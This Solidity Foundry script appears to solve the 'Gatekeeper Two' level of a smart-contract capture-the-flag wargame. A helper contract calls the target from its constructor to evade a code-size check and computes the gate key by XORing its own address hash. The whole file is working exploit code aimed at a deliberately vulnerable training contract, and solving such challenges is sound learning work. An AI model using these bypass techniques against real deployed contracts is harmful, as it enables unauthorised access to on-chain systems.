// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/14_Gatekeeper_Two.sol";

contract Helper {

    constructor(GatekeeperTwo _target) {
        GatekeeperTwo target = _target;
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        target.enter(key);
    }
}

contract POC is Script {
    GatekeeperTwo public target;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        target = GatekeeperTwo(0xF6eB5204Cf42Bc381CBf19e8F0C5bdb1E2a54e79);
        
        address entrant = target.entrant();
        console.log("before entrant: ", entrant);

        Helper helper = new Helper(target);

        entrant = target.entrant();
        console.log("after  entrant: ", entrant);

        vm.stopBroadcast();
    }
}